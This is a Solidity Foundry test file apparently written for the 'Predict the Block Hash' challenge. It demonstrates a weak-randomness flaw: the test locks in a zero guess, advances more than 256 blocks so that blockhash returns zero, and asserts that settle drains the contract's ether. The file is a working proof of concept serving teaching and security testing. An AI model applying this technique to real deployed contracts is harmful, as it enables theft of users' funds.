
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber + 2 < type(uint256).max);

        vm.roll(blockNumber);

        bytes32 predictedAnswer = bytes32(0);
        _contractUnderTest.lockInGuess{value: 1 ether}(predictedAnswer);

        uint256 targetBlock = block.number + 1;

        vm.roll(targetBlock + 257);

        bytes32 localAnswer = blockhash(targetBlock);
        assertEq(localAnswer, predictedAnswer, "After 256 blocks, blockhash should be zero");

        uint256 balanceBefore = address(this).balance;
        _contractUnderTest.settle();
        uint256 balanceAfter = address(this).balance;

        assertEq(balanceAfter, balanceBefore + 2 ether, "Predictable randomness allowed draining the pot");
    }
}
